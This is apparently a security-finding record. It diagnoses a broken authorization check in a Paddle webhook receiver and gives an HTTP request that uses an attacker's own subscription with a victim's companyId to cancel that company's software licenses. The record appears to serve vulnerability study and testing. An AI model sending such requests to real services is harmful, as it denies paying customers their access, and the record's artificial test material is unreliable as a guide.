diagnosis: The Paddle webhook receiver verifies webhook signatures, but parses companyId from the passthrough parameter and revokes company software seat licenses without checking whether the subscription_id actually matches the active subscription registered for that companyId. An attacker cancelling their own subscription can supply a competitor's companyId to terminate their software access.
exploit_request:
POST /webhooks/paddle/subscription-cancelled HTTP/1.1
Host: licensing.enterprise-apps.com
Content-Type: application/x-www-form-urlencoded

p_signature=valid_paddle_rsa_signature&subscription_id=sub_attacker_3310&passthrough=%7B%22companyId%22%3A%22comp_victim_global_500%22%7D
